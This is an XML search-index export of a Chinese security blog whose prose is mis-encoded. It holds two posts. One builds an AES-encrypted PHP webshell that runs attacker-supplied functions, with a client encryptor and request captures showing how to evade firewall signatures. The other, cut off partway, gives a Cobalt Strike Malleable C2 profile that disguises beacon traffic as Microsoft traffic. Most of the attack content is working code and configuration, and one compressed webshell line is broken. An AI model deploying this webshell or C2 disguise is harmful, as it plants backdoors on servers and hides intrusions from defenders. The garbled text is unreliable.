<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†ä¸€å¥è¯æœ¨é©¬</title>
      <link href="2023/03/22/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
      <url>2023/03/22/%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘ä»¬å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬å®¢æˆ·ç«¯åœ¨å‘æœåŠ¡å™¨å‘é€Payloadæ—¶å°±ä¼šè¢«æ‹¦æˆªï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†æœ‰äº›åœºæ™¯ä¸‹ä¼šå‡ºç°ä¸€å¥è¯è™½ç„¶å·²ç»æˆåŠŸä¸Šä¼ ï¼Œä½†æ˜¯å´æ— æ³•è¿æ¥çš„æƒ…å†µã€‚ä½†å¦‚æœä½¿æœåŠ¡å™¨æ‰€æˆªè·çš„æµé‡ä½¿åŠ å¯†è¿‡çš„äºŒè¿›åˆ¶æµï¼Œè¿™æ ·å°±å¤§å¤§å‡å°äº†è¢«æ‹¦æˆªçš„æ¦‚ç‡</p><a id="more"></a><h1 id="ä¸ºä½•è¢«æ‹¦æˆª"><a href="#ä¸ºä½•è¢«æ‹¦æˆª" class="headerlink" title="ä¸ºä½•è¢«æ‹¦æˆª"></a>ä¸ºä½•è¢«æ‹¦æˆª</h1><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥éšä¾¿æ‰¾ä¸€ä¸ªpayloadï¼Œæ¥åˆ†æä¸€ä¸‹å…¶ç‰¹å¾<br><img src="https://s2.loli.net/2023/03/22/EUotvynr4IDPcbQ.png"><br>å¯ä»¥çœ‹åˆ°è™½ç„¶å…³é”®çš„ä»£ç é‡‡ç”¨äº†base64ç¼–ç ï¼Œä½†æ˜¯payloadä¸­æ‰”æœ‰å¤šä¸ªæ˜æ˜¾çš„ç‰¹å¾ï¼Œæ¯”å¦‚æœ‰evalå…³é”®è¯ï¼Œæœ‰Convert.FromBase64Stringï¼Œæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œå‚æ•°åä¸ºcaidaoï¼ˆå¯†ç å­—æ®µï¼‰ã€z1ã€z2ï¼Œå‚æ•°å€¼æœ‰base64ç¼–ç ã€‚é’ˆå¯¹è¿™äº›ç‰¹å¾å¾ˆå®¹æ˜“å†™å‡ºå¯¹åº”çš„é˜²æŠ¤è§„åˆ™ï¼Œæ¯”å¦‚ï¼šPOSTè¯·æ±‚ä¸­æœ‰Convert.FromBase64Stringå…³é”®å­—ï¼Œæœ‰z1å’Œz2å‚æ•°ï¼Œz1å‚æ•°å€¼ä¸º4ä¸ªå­—ç¬¦ï¼Œz2å‚æ•°å€¼ä¸ºbase64ç¼–ç å­—ç¬¦ã€‚<br>è¿™ç§å¤§é‡çš„æ··æ·†ï¼Œç¼–ç ï¼Œå¯èƒ½ä¼šæš‚æ—¶çš„ç»•è¿‡é˜²ç«å¢™ï¼Œä½†é˜²å®ˆæ–¹ä¹Ÿèƒ½å¾ˆè½»æ˜“çš„è§£ç ï¼Œå°†å…¶æ–°çš„ç‰¹å¾åŠ å…¥è§„åˆ™ä¸­ã€‚<br>ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œ æˆ‘ä»¬å°è¯•ç›´æ¥å¯¹ä¼ è¾“çš„æµé‡è¿›è¡ŒåŠ å¯†ï¼Œå¯¹äºä¸åŒçš„æ“ä½œï¼Œé‡‡ç”¨ä¸åŒçš„å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œè¿™æ ·é˜²å®ˆæ–¹å°±å¾ˆéš¾å†å»è¿›è¡Œåˆ†ææ¥æå–å‡ºç‰¹å¾ã€‚<br>é‚£æˆ‘ä»¬çš„æ€è·¯å°±æ¯”è¾ƒæ˜ç¡®äº†ï¼Œä¸»è¦çš„æµç¨‹æ˜¯</p><ol><li>å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ç”³è¯·ä¸€ä¸ªå¯†é’¥</li><li>æœåŠ¡å™¨éšæœºç”Ÿæˆå¯†é’¥ï¼Œå¹¶å°†å…¶å†™å…¥sessionï¼Œè¿”å›ç»™å®¢æˆ·ç«¯</li><li>å®¢æˆ·ç«¯ç”¨æœåŠ¡å™¨è¿”å›çš„å¯†é’¥å¯¹payloadè¿›è¡ŒåŠ å¯†ï¼Œæ¥ç€å°†åŠ å¯†åçš„payloadå‘ç»™æœåŠ¡å™¨</li><li>æœåŠ¡å™¨å¯¹æ”¶åˆ°çš„payloadè¿›è¡Œè§£å¯†å¹¶æ‰§è¡Œï¼Œæœ€åè¿”å›ç»“æœç»™å®¢æˆ·ç«¯<h1 id="åˆæ­¥å®ç°"><a href="#åˆæ­¥å®ç°" class="headerlink" title="åˆæ­¥å®ç°"></a>åˆæ­¥å®ç°</h1>å’ŒJavaå’Œ.NETä¸åŒï¼ŒPHPå¹¶ä¸å­˜åœ¨æ‰‹åŠ¨ç¼–è¯‘çš„è¿‡ç¨‹ï¼Œå¼€å‘äººå‘˜åªè¦æä¾›PHPæºä»£ç ï¼Œç„¶åPHPä¼šè‡ªå·±æŠŠæºä»£ç ç¼–è¯‘ä¸ºopcodeï¼Œç”±Zendå¼•æ“æ¥è§£æopcodeã€‚å› ä¸ºä¸å­˜åœ¨ç¼–è¯‘çš„ä¸­é—´ç¯èŠ‚ï¼Œä¹Ÿå°±ä¸å­˜åœ¨å·²ç¼–è¯‘çš„äºŒè¿›åˆ¶ç±»æ–‡ä»¶ã€‚<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$key</span>=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$key</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>];<br>    <span class="hljs-variable">$decrptContent</span> = openssl_decrypt(<span class="hljs-variable">$result</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;Glacier__glacier&#x27;</span>);<br>    <span class="hljs-variable">$arr</span>=explode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$decrptContent</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br>    <span class="hljs-variable">$func</span>(<span class="hljs-variable">$params</span>); <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>æ•´ä¸ªè¿‡ç¨‹ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œé¦–å…ˆæ˜¯GETç±»å‹è¯·æ±‚ï¼ŒæœåŠ¡å™¨éšæœºç”Ÿæˆä¸€ä¸ªå¯†é’¥ï¼Œå°†å…¶å†™å…¥sessionï¼ŒåŒæ—¶è¿”å›ç»™å®¢æˆ·ç«¯<br>ç¬¬äºŒéƒ¨åˆ†å°±æ˜¯ä¼ è¾“payloadï¼ŒæœåŠ¡ç«¯å¯¹å…¶è¿›è¡Œè§£å¯†å¹¶æ‰§è¡Œ<br>ä¾‹å¦‚ï¼Œå®¢æˆ·ç«¯ä¼ å…¥<code>assert|eval(&quot;phpinfo();&quot;)</code>ï¼ŒæœåŠ¡ç«¯å†explodeå°†å…¶åˆ†å‰²ï¼Œæœ€åæ‰§è¡Œ<code>assert(&quot;eval(\&quot;phpinfo();\&quot;)&quot;)</code><br>å°†å…¶å‹ç¼©ä¸€ä¸‹ï¼Œçœ‹ç€æ›´åƒæ˜¯ä¸€å¥è¯<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> session_start();<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])?<span class="hljs-keyword">print</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=substr(md5(uniqid(rand())),<span class="hljs-number">16</span>):(<span class="hljs-variable">$b</span>=explode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>], <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>])))&amp;<span class="hljs-variable">$b</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>æ¥ä¸‹æ¥éœ€è¦å†æœ¬åœ°ç”Ÿæˆä¸€ä¸ªpayload<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;836f3ab76289b6e2&quot;</span>;<br>    <span class="hljs-variable">$payload</span> = <span class="hljs-string">&#x27;assert|eval(&quot;phpinfo();&quot;)&#x27;</span>;<br>    <span class="hljs-variable">$encrpycontent</span>=openssl_encrypt(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;AES128&quot;</span>,<span class="hljs-variable">$key</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;Glacier__glacier&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$encrpycontent</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>æ¥ç€æˆ‘ä»¬æ¥è¯•ä¸€ä¸‹æ•ˆæœ<br>åœ¨ä¼ ä¸Šæˆ‘ä»¬æ–°å‹çš„ç ä¹‹åï¼Œå…ˆä½¿ç”¨GETç±»å‹è®¿é—®ï¼Œè·å–æœåŠ¡ç«¯æ‰€ç”Ÿæˆçš„éšæœºå¯†é’¥<br><img src="https://s2.loli.net/2023/03/22/kGdYLZv8lUK2Jwh.png"><br>ç”¨è¯¥éšæœºå¯†é’¥åœ¨æˆ‘ä»¬æœ¬åœ°æ¥åŠ å¯†payload<br><img src="https://s2.loli.net/2023/03/22/yNCrVDLQEXi92c6.png"><br>æœ€åå°†åŠ å¯†åçš„payloadä½¿ç”¨postæ–¹æ³•ä¼ è¾“ç»™æœåŠ¡ç«¯<br><img src="https://s2.loli.net/2023/03/22/nGECAo7M4aHgW5u.png"><br>æˆåŠŸæ‰§è¡Œ</li></ol><h1 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h1><p>æ¥ä¸‹æ¥æˆ‘ä»¬åˆ†æä¸‹æœåŠ¡ç«¯èƒ½çœ‹åˆ°çš„æµé‡<br>é¦–å…ˆæ˜¯GETæ–¹å¼è¯·æ±‚è·å–ç”Ÿæˆçš„éšæœºå¯†é’¥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> http://<span class="hljs-number">127.0.0.1</span>/test/exp.php?key=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">sec</span>-ch-ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;105&quot;</span>, <span class="hljs-string">&quot;Not)A;Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span><br><span class="hljs-attribute">sec</span>-ch-ua-mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">105</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5195</span>.<span class="hljs-number">102</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: PHPSESSID=e<span class="hljs-number">1</span>jtekehablohs<span class="hljs-number">4</span>t<span class="hljs-number">8</span>b<span class="hljs-number">8</span>utft<span class="hljs-number">504</span><br><span class="hljs-attribute">Connection</span>: close<br></code></pre></td></tr></table></figure><p>å”¯ä¸€å¯èƒ½ä¼šè¢«åˆ—å…¥è§„åˆ™çš„ç‰¹å¾å°±æ˜¯<code>key</code>ï¼Œä½†è¿™ä¸ªå‚æ•°å¯ä»¥å°†å…¶æ”¹ä¸ºä¸åŸç½‘ç«™å·²å­˜åœ¨çš„GETè¯·æ±‚ç›¸ä¼¼çš„å‚æ•°æ¥å¯¹æŠ—é˜²å®ˆæ–¹<br>æ¥ä¸‹æ¥çœ‹çœ‹POSTä¼ å…¥çš„åŠ å¯†åçš„payloadï¼Œè·ŸGETç±»å‹ä¸€æ ·ï¼Œå”¯ä¸€å¯èƒ½ä¼šè¢«åˆ—å…¥è§„åˆ™çš„ç‰¹å¾å°±æ˜¯<code>payload</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è·ŸGETä½¿ç”¨åŒæ ·çš„æ–¹æ³•æ¥éšè—ï¼Œæˆ–è€…ä½¿ç”¨<code>file_get_contents(&quot;php://input&quot;)</code>æ¥è·å–ä¼ å…¥phpä¸­çš„æ‰€æœ‰æ•°æ®æµæ¥æ›´å¥½çš„éšè—ç‰¹å¾</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> http://<span class="hljs-number">127.0.0.1</span>/test/exp.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">sec</span>-ch-ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;105&quot;</span>, <span class="hljs-string">&quot;Not)A;Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span><br><span class="hljs-attribute">sec</span>-ch-ua-mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">105</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5195</span>.<span class="hljs-number">102</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: PHPSESSID=e<span class="hljs-number">1</span>jtekehablohs<span class="hljs-number">4</span>t<span class="hljs-number">8</span>b<span class="hljs-number">8</span>utft<span class="hljs-number">504</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">52</span><br><br><span class="hljs-attribute">payload</span>=INEgabMVaW<span class="hljs-number">1</span>BCNKmXy<span class="hljs-number">2</span>j<span class="hljs-number">0</span>F<span class="hljs-number">5</span>yrE/Q<span class="hljs-number">2</span>w<span class="hljs-number">2</span>IBCoVwnBOFPQ=<br></code></pre></td></tr></table></figure><hr><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://xz.aliyun.com/t/2744#toc-8">https://xz.aliyun.com/t/2744#toc-8</a><br><a href="https://xz.aliyun.com/t/2774">https://xz.aliyun.com/t/2774</a><br><a href="https://security.tencent.com/index.php/blog/msg/202">https://security.tencent.com/index.php/blog/msg/202</a></p>]]></content>
      
      
      <categories>
          
          <category> å…æ€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeæµé‡æ··æ·†ä¸åŠ å¯†</title>
      <link href="2023/03/16/Cobaltstrike%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8A%A0%E5%AF%86/"/>
      <url>2023/03/16/Cobaltstrike%E6%B5%81%E9%87%8F%E6%B7%B7%E6%B7%86%E4%B8%8E%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>ç›®æ ‡ä¸»æœºä¸serverç«¯çš„é€šä¿¡ä¸ºHTTPåè®®ï¼Œç”±æ­¤ï¼Œå½“æˆ‘ä»¬å¯¹cobalt strikeçš„serverç«¯è¿›è¡Œéšè—ï¼Œä¼ªé€ æˆä¸€ä¸ªæ­£å¸¸çš„WebæœåŠ¡å™¨ï¼Œä»¥æ­¤æ¥ä¼ªè£…æµé‡ï¼Œæœ€ç»ˆè¾¾åˆ°é€šä¿¡éšåŒ¿çš„æ•ˆæœã€‚cobalt strikeé€šè¿‡æä¾›Malleable-C2-Profilesæ¥å®ç°ä¸Šè¿°ç›®çš„</p><a id="more"></a><h1 id="æµé‡æ··æ·†ã€æ¬ºéª—ã€åŠ å¯†"><a href="#æµé‡æ··æ·†ã€æ¬ºéª—ã€åŠ å¯†" class="headerlink" title="æµé‡æ··æ·†ã€æ¬ºéª—ã€åŠ å¯†"></a>æµé‡æ··æ·†ã€æ¬ºéª—ã€åŠ å¯†</h1><h2 id="Malleable-C2-Profilesæ„é€ "><a href="#Malleable-C2-Profilesæ„é€ " class="headerlink" title="Malleable-C2-Profilesæ„é€ "></a>Malleable-C2-Profilesæ„é€ </h2><p>Beaconçš„HTTPçš„indicatorsç”±Malleable-C2-profileæ–‡ä»¶æ§åˆ¶ï¼Œå…³äºMalleable-C2-profileï¼Œå®ƒæ˜¯ä¸€ä¸ªç®€å•çš„é…ç½®æ–‡ä»¶ï¼Œç”¨æ¥æŒ‡å®šå¦‚ä½•è½¬æ¢æ•°æ®å¹¶å°†å…¶å­˜å‚¨åœ¨transactionä¸­ï¼Œè½¬æ¢å’Œå­˜å‚¨æ•°æ®çš„ç›¸åŒé…ç½®æ–‡ä»¶ä¹Ÿä»transactionä¸­æå–å’Œæ¢å¤ã€‚<br>ä½¿ç”¨æ–¹æ³•ï¼š<code>./teamserver [external IP] [password] [/path/to/my.profile]</code><br>æ£€æŸ¥æ–¹æ³•ï¼š<code>./c2lint [/path/to/my.profile]</code></p><p>è¿™é‡Œç›´æ¥æ”¾ä¸Šæˆ‘ä¸ªäººä¿®æ”¹çš„profile</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs abnf">set sample_name <span class="hljs-string">&quot;Glacier Profile&quot;</span><span class="hljs-comment">;</span><br>set sleeptime  <span class="hljs-string">&quot;5000&quot;</span><span class="hljs-comment">; # use a ~30s delay between callbacks</span><br>set jitter <span class="hljs-string">&quot;0&quot;</span><span class="hljs-comment">;# throw in a 10% jitter;</span><br>set useragent <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span><span class="hljs-comment">;</span><br><br>https-certificate&#123;<br>set CN <span class="hljs-string">&quot;US&quot;</span><span class="hljs-comment">;</span><br>set O <span class="hljs-string">&quot;MicrosoftUpdates&quot;</span><span class="hljs-comment">;</span><br>set C <span class="hljs-string">&quot;en&quot;</span><span class="hljs-comment">;</span><br>set L <span class="hljs-string">&quot;en&quot;</span><span class="hljs-comment">;</span><br>set OU <span class="hljs-string">&quot;MicrosoftUpdates&quot;</span><span class="hljs-comment">;</span><br>set ST <span class="hljs-string">&quot;US&quot;</span><span class="hljs-comment">;</span><br>set validity <span class="hljs-string">&quot;365&quot;</span><span class="hljs-comment">;</span><br>set keystore <span class="hljs-string">&quot;glacier.store&quot;</span><span class="hljs-comment">;</span><br>set password <span class="hljs-string">&quot;glacier123&quot;</span><span class="hljs-comment">;</span><br>&#125;<br>http-get &#123;<br>    set uri <span class="hljs-string">&quot;/pixel.gif&quot;</span><span class="hljs-comment">;</span><br>    client &#123;<br>        header <span class="hljs-string">&quot;Host&quot;</span> <span class="hljs-string">&quot;microsoft.com&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;http://www.baidu.com&quot;</span><span class="hljs-comment">;</span><br>header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;kepp-alive&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Pragma&quot;</span> <span class="hljs-string">&quot;no-cache&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Cache-Control&quot;</span> <span class="hljs-string">&quot;no-cache&quot;</span><span class="hljs-comment">;</span><br>        metadata &#123;<br>            netbios<span class="hljs-comment">;</span><br>            prepend <span class="hljs-string">&quot;session-token=&quot;</span><span class="hljs-comment">;</span><br>            prepend <span class="hljs-string">&quot;skin=noskin;&quot;</span><span class="hljs-comment">;</span><br>            append <span class="hljs-string">&quot;csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;</span><span class="hljs-comment">;</span><br>            header <span class="hljs-string">&quot;Cookie&quot;</span><span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br><br>    server &#123;<br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/octet-stream&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;Microsoft-IIS/6.0&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;X-Powered-By&quot;</span> <span class="hljs-string">&quot;ASP.NET&quot;</span><span class="hljs-comment">;</span><br>        output &#123;<br>            netbios<span class="hljs-comment">;  # åŠ å¯†æ–¹å¼ï¼ˆbase64ã€base64urlã€netbiosã€netbiosuï¼‰</span><br>            print<span class="hljs-comment">;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br>http-post &#123;<br>    set uri <span class="hljs-string">&quot;/email/&quot;</span><span class="hljs-comment">;</span><br>    client &#123;<br>        header <span class="hljs-string">&quot;Host&quot;</span> <span class="hljs-string">&quot;microsoft.com&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;http://www.baidu.com&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/octet-stream&quot;</span><span class="hljs-comment">;</span><br>header <span class="hljs-string">&quot;Connection&quot;</span> <span 